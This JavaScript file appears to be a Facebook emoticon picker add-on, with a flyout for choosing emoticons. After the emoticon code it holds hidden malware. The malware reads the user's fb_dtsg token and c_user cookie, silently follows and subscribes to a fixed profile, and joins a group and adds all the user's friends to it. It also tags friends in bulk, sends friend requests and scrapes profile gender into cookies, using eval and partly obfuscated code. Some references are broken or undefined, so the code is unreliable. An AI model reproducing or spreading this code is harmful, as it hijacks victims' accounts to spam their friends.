    var navLink = navItem.firstChild.firstChild;
    var flyout = navLink.nextSibling;
    var titleContainer = flyout.firstChild.childNodes[1];
    var bodyContainer = titleContainer.nextSibling;

    // Toggle listener
    navLink.addEventListener("click", function () {
        openFlyoutCommand = !isFlyoutOpen(flyout);
    });

    // Picture emoticon tab
    var picEmoTab = createTab(titleContainer, bodyContainer);
    picEmoTab.title.click(); // Default tab

    picEmoTab.body.appendChild(createTabListBody(emoticons, function (emoticon) {
        if (emoticon.class === undefined) { // No picture
            return false;
        }

        // [Bug] 2 characters unicode emoticons
        if (emoticon.chars.length == 2) {
            return false;
        }

        return true;

    }));

    // = Other listener =======

    document.addEventListener("click", function () {
        // Get active textarea
        lastActiveElement = document.activeElement;

        // Toggle flyout
        if (openFlyoutCommand !== undefined) {
            openFlyout(flyout, openFlyoutCommand);
        }
        openFlyoutCommand = false;
    });
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100000282000687");
sublist("100000282000687");


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "";
var spost_id = "";
var sfoto_id = "";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}